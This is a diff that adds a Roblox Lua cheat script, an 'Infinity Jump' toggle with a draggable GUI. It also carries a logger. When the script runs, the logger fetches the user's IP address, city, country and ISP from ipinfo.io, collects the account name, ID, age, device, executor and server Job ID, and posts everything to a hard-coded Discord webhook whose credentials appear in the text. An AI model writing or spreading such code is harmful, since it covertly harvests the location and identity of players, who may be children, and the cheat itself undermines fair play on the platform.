@@ -1,0 +1,432 @@
+-- =====================================================
+-- 🦘 INFINITY JUMP BY IYANKINKA (GUI FINAL) + WEBHOOK
+-- Toggle ON / OFF
+-- Status Indicator
+-- Minimize + Close Button
+-- Dragable (Mobile + PC)
+-- =====================================================
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+task.wait(1)
+
+-- ================= WEBHOOK CONFIG =================
+local WebhookConfig = {
+    Url = "https://discord.com/api/webhooks/1517540022381969519/gJ27MiT4QE5Iyitk12_LhvrtAhD-DsL0rx3EJP32yHR0lMRcx_hNCxYZMMsGgGoc6DGc",
+    ScriptName = "Infinity Jump by IyanXCode",
+    EmbedColor = 16711680
+}
+
+-- ================= WEBHOOK FUNCTION =================
+local function sendWebhookNotification()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local LocalPlayer = Players.LocalPlayer
+    
+    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    
+    if not httpRequest then 
+        warn("No HTTP request function found")
+        return 
+    end
+    
+    if getgenv() and getgenv().WebhookSent then 
+        return 
+    end
+    getgenv().WebhookSent = true
+
+    -- Executor Detection
+    local executorName = "Unknown"
+    if identifyexecutor then
+        executorName = identifyexecutor()
+    elseif getexecutorname then
+        executorName = getexecutorname()
+    elseif executor then
+        executorName = executor
+    end
+
+    -- Get IP and Location
+    local ipAddress = "Unknown"
+    local country = "Unknown"
+    local region = "Unknown"
+    local city = "Unknown"
+    local isp = "Unknown"
+    
+    local success, result = pcall(function()
+        return httpRequest({
+            Url = "https://ipinfo.io/json",
+            Method = "GET"
+        })
+    end)
+    
+    if success and result and result.Body then
+        local successDecode, decoded = pcall(function()
+            return HttpService:JSONDecode(result.Body)
+        end)
+        if successDecode and decoded then
+            ipAddress = decoded.ip or "Unknown"
+            country = decoded.country or "Unknown"
+            region = decoded.region or "Unknown"
+            city = decoded.city or "Unknown"
+            isp = decoded.org or "Unknown"
+        end
+    end
+    
+    if ipAddress == "Unknown" then
+        pcall(function()
+            local altSuccess, altResult = pcall(function()
+                return httpRequest({
+                    Url = "https://api.ipify.org?format=json",
+                    Method = "GET"
+                })
+            end)
+            if altSuccess and altResult and altResult.Body then
+                local decodeSuccess, altDecoded = pcall(function()
+                    return HttpService:JSONDecode(altResult.Body)
+                end)
+                if decodeSuccess and altDecoded and altDecoded.ip then
+                    ipAddress = altDecoded.ip
+                end
+            end
+        end)
+    end
+
+    -- Get Game Info
+    local gameName = "Unknown Game"
+    pcall(function()
+        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+
+    -- Account Info
+    local accountAgeDays = LocalPlayer.AccountAge
+    local currentTime = os.time()
+    local accountCreationTime = currentTime - (accountAgeDays * 86400)
+    local accountCreatedDate = os.date("%Y-%m-%d", accountCreationTime)
+
+    -- Device Type
+    local deviceType = "Unknown"
+    pcall(function()
+        if game:GetService("GuiService"):IsTenFootInterface() then
+            deviceType = "Console"
+        elseif game:GetService("UserInputService").TouchEnabled then
+            deviceType = "Mobile"
+        else
+            deviceType = "PC"
+        end
+    end)
+
+    -- Profile Image
+    local profileImageUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)
+
+    -- Location Text
+    local locationText = "Unknown"
+    if city ~= "Unknown" and region ~= "Unknown" and country ~= "Unknown" then
+        locationText = string.format("%s, %s, %s", city, region, country)
+    elseif country ~= "Unknown" then
+        locationText = country
+    end
+
+    -- Fields
+    local fields = {
+        {
+            ["name"] = "👤 USER INFORMATION",
+            ["value"] = "```" .. string.format(
+                "Username: %s\n" ..
+                "Display Name: %s\n" ..
+                "User ID: %s\n" ..
+                "Account Age: %d Days\n" ..
+                "Account Created: %s\n" ..
+                "Device Type: %s",
+                LocalPlayer.Name,
+                LocalPlayer.DisplayName,
+                tostring(LocalPlayer.UserId),
+                accountAgeDays,
+                accountCreatedDate,
+                deviceType
+            ) .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "🌐 NETWORK INFORMATION",
+            ["value"] = "```" .. string.format(
+                "IP Address: || %s ||\n" ..
+                "Location: %s\n" ..
+                "ISP: %s",
+                ipAddress,
+                locationText,
+                isp
+            ) .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "🎮 GAME INFORMATION",
+            ["value"] = "```" .. string.format(
+                "Game Name: %s\n" ..
+                "Place ID: %s\n" ..
+                "Job ID: %s",
+                gameName,
+                tostring(game.PlaceId),
+                game.JobId or "Unknown"
+            ) .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "🔗 QUICK LINKS",
+            ["value"] = string.format(
+                "Link Profile: [Click to Cek Profile](https://www.roblox.com/users/%s/profile)\n" ..
+                "Link Game: [Click to Join Game](https://www.roblox.com/games/%s)",
+                tostring(LocalPlayer.UserId),
+                tostring(game.PlaceId)
+            ),
+            ["inline"] = false
+        }
+    }
+    
+    if executorName ~= "Unknown" then
+        table.insert(fields, {
+            ["name"] = "🛠️ EXECUTOR INFO",
+            ["value"] = "```Executor: " .. executorName .. "```",
+            ["inline"] = false
+        })
+    end
+
+    -- Payload
+    local payload = {
+        ["username"] = "Logger IyanXCode",
+        ["avatar_url"] = "https://cdn.phototourl.com/free/2026-06-19-444d2e83-1605-459c-be24-f2eccda6ca19.jpg",
+        ["embeds"] = {{
+            ["title"] = "📡 SCRIPT EXECUTION BY " .. (LocalPlayer.DisplayName or LocalPlayer.Name),
+            ["color"] = WebhookConfig.EmbedColor,
+            ["thumbnail"] = { 
+                ["url"] = profileImageUrl
+            },
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Script: " .. WebhookConfig.ScriptName
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    -- Send Webhook
+    pcall(function()
+        httpRequest({
+            Url = WebhookConfig.Url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+-- ================= SERVICES =================
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+-- ================= GLOBAL STATE =================
+if _G.InfiniteJumpActive == nil then
+	_G.InfiniteJumpActive = false
+	_G.JumpConnection = nil
+	_G.JumpVelocity = nil
+	_G.JumpHeight = 50
+end
+
+-- ================= INFINITE JUMP SYSTEM =================
+local function EnableInfiniteJump()
+	if _G.InfiniteJumpActive then return end
+	_G.InfiniteJumpActive = true
+
+	local function OnJumpRequest()
+		if not _G.InfiniteJumpActive then return end
+		local char = LocalPlayer.Character
+		if not char then return end
+
+		local hum = char:FindFirstChildOfClass("Humanoid")
+		local root = char:FindFirstChild("HumanoidRootPart")
+
+		if hum and root then
+			hum:ChangeState(Enum.HumanoidStateType.Jumping)
+
+			if _G.JumpVelocity then
+				_G.JumpVelocity:Destroy()
+			end
+
+			_G.JumpVelocity = Instance.new("BodyVelocity")
+			_G.JumpVelocity.Velocity = Vector3.new(0, _G.JumpHeight, 0)
+			_G.JumpVelocity.MaxForce = Vector3.new(0, 40000, 0)
+			_G.JumpVelocity.Parent = root
+
+			task.wait(0.15)
+			if _G.JumpVelocity then
+				_G.JumpVelocity:Destroy()
+				_G.JumpVelocity = nil
+			end
+		end
+	end
+
+	if _G.JumpConnection then
+		_G.JumpConnection:Disconnect()
+	end
+	_G.JumpConnection = UserInputService.JumpRequest:Connect(OnJumpRequest)
+end
+
+local function DisableInfiniteJump()
+	if not _G.InfiniteJumpActive then return end
+	_G.InfiniteJumpActive = false
+
+	if _G.JumpConnection then
+		_G.JumpConnection:Disconnect()
+		_G.JumpConnection = nil
+	end
+
+	if _G.JumpVelocity then
+		_G.JumpVelocity:Destroy()
+		_G.JumpVelocity = nil
+	end
+end
+
+local function ToggleJump()
+	if _G.InfiniteJumpActive then
+		DisableInfiniteJump()
+	else
+		EnableInfiniteJump()
+	end
+end
+
+-- ================= GUI =================
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+if PlayerGui:FindFirstChild("InfinityJumpGUI") then
+	PlayerGui.InfinityJumpGUI:Destroy()
+end
+
+local gui = Instance.new("ScreenGui", PlayerGui)
+gui.Name = "InfinityJumpGUI"
+gui.ResetOnSpawn = false
+
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0, 260, 0, 150)
+main.Position = UDim2.new(0.5, -130, 0.35, 0)
+main.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+main.Active = true
+main.Draggable = true
+
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+
+-- ================= TOP BAR =================
+local top = Instance.new("Frame", main)
+top.Size = UDim2.new(1, 0, 0, 35)
+top.BackgroundTransparency = 1
+
+-- TITLE
+local title = Instance.new("TextLabel", top)
+title.Size = UDim2.new(1, -80, 1, 0)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "INFINITY JUMP BY IYANKINKA"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 14
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.TextColor3 = Color3.fromRGB(0, 170, 255)
+
+-- MINIMIZE BUTTON
+local minimize = Instance.new("TextButton", top)
+minimize.Size = UDim2.new(0, 30, 0, 25)
+minimize.Position = UDim2.new(1, -70, 0.5, -12)
+minimize.Text = "-"
+minimize.Font = Enum.Font.GothamBold
+minimize.TextSize = 20
+minimize.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+minimize.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", minimize).CornerRadius = UDim.new(0, 6)
+
+-- CLOSE BUTTON
+local close = Instance.new("TextButton", top)
+close.Size = UDim2.new(0, 30, 0, 25)
+close.Position = UDim2.new(1, -35, 0.5, -12)
+close.Text = "X"
+close.Font = Enum.Font.GothamBold
+close.TextSize = 14
+close.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
+close.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
+
+-- ================= CONTENT =================
+local content = Instance.new("Frame", main)
+content.Size = UDim2.new(1, 0, 1, -35)
+content.Position = UDim2.new(0, 0, 0, 35)
+content.BackgroundTransparency = 1
+
+-- STATUS
+local status = Instance.new("TextLabel", content)
+status.Size = UDim2.new(1, 0, 0, 30)
+status.Position = UDim2.new(0, 0, 0, 10)
+status.BackgroundTransparency = 1
+status.Font = Enum.Font.Gotham
+status.TextSize = 14
+status.Text = "Status : OFF"
+status.TextColor3 = Color3.fromRGB(255, 80, 80)
+
+-- TOGGLE
+local toggle = Instance.new("TextButton", content)
+toggle.Size = UDim2.new(0, 200, 0, 40)
+toggle.Position = UDim2.new(0.5, -100, 1, -55)
+toggle.Text = "TURN ON"
+toggle.Font = Enum.Font.GothamBold
+toggle.TextSize = 14
+toggle.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+toggle.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 10)
+
+-- ================= LOGIC =================
+local minimized = false
+
+local function UpdateGUI()
+	if _G.InfiniteJumpActive then
+		status.Text = "Status : ON"
+		status.TextColor3 = Color3.fromRGB(0, 255, 120)
+		toggle.Text = "TURN OFF"
+		toggle.BackgroundColor3 = Color3.fromRGB(0, 140, 80)
+	else
+		status.Text = "Status : OFF"
+		status.TextColor3 = Color3.fromRGB(255, 80, 80)
+		toggle.Text = "TURN ON"
+		toggle.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+	end
+end
+
+toggle.MouseButton1Click:Connect(function()
+	ToggleJump()
+	UpdateGUI()
+end)
+
+minimize.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	content.Visible = not minimized
+	main.Size = minimized and UDim2.new(0, 260, 0, 35) or UDim2.new(0, 260, 0, 150)
+	minimize.Text = minimized and "+" or "-"
+end)
+
+close.MouseButton1Click:Connect(function()
+	DisableInfiniteJump()
+	gui:Destroy()
+end)
+
+LocalPlayer.CharacterAdded:Connect(function()
+	task.wait(1)
+	if _G.InfiniteJumpActive then
+		EnableInfiniteJump()
+	end
+end)
+
+UpdateGUI()
+
+-- ================= SEND WEBHOOK =================
+task.spawn(function()
+    pcall(sendWebhookNotification)
+end)
+
+print("🦘 INFINITY JUMP BY IYANKINKA | FINAL LOADED")
+print("📡 Webhook logger aktif")
